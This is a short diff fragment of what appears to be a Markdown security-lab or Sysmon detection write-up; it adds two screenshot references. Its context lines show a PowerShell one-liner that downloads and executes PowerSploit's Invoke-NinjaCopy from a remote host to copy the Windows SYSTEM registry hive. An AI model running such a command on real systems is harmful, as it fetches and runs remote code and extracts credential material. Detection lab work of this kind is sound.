@@ -318,6 +318,10 @@ output {
 https://github.com/mattifestation/PowerSploit.git
 ```
 
+![sysmon](../images/WechatIMG83.jpeg)
+
+![sysmon](../images/WechatIMG84.jpeg)
+
 ```bash
 powershell IEX (New-Object System.Net.Webclient).DownloadString(\"http://172.16.251.133/Exfiltration/Invoke-NinjaCopy.ps1\");Invoke-NinjaCopy  -Path   C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
 
